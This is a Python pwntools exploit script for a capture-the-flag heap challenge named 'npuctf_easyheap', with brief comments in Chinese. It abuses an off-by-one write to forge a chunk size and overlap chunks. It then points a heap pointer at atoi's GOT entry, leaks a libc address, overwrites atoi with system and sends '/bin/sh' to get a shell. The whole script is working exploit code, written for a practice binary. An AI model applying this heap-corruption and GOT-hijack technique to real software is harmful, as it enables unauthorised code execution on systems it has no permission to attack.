#!/usr/bin/env python
# coding=utf-8
from LibcSearcher import *
from pwn import *

io = process('./npuctf_easyheap')
elf = ELF('./npuctf_easyheap')
context(log_level='debug', os='linux', arch='amd64')
libc = ELF("libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


def choice(c):
    io.recvuntil("Your choice :")
    io.sendline(str(c))


def add(size, content):
    choice(1)
    io.recvuntil("Size of Heap(0x10 or 0x20 only) :")
    io.sendline(str(size))
    io.recvuntil("Content:")
    io.send(content)


def edit(index, content):
    choice(2)
    io.recvuntil("Index :")
    io.sendline(str(index))
    io.recvuntil("Content:")
    io.send(content)


def show(index):
    choice(3)
    io.recvuntil("Index :")
    io.sendline(str(index))


def free(index):
    choice(4)
    io.recvuntil("Index :")
    io.sendline(str(index))


def exit():
    choice(5)


def getshell():
    io.recvuntil("Your choice :")
    io.sendline("/bin/sh\x00")


atoi_got_addr = 0x602058
add(0x18, 'AAAA')  # 0
add(0x18, 'BBBB')  # 1
add(0x18, 'CCCC')  # 2
add(0x18, 'DDDD')  # 3
edit(0, b'A' * 0x18 + b'\x41')

free(1)

add(0x38,b'j' * 8 * 4 + p64(0x41) + p64(atoi_got_addr)) #　p64(0x41)
"""
这里为什么用 0x41?
x atio
x sytem  #至少 3个字节不一样。
自带一个offbyone,输入值至少为2
一般用atoi，输入时经过此函数。改为system。
atoi(buf)->   system(buf) -> getshell
"""

show(1)

leak = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
log.success(hex(leak))
# libc = LibcSearcher("atoi",leak)
# libc_base = leak - libc.sym['atoi'] - 0x8a0
# system = libc_base + libc.sym['system'] + 0x1140
libc_base = leak - libc.sym['atoi']
system = libc_base + libc.sym['system']
# log.success(hex(libc_base))
gdb.attach(io)
log.success(hex(system))
edit(1, p64(system))
#
getshell()
io.interactive()
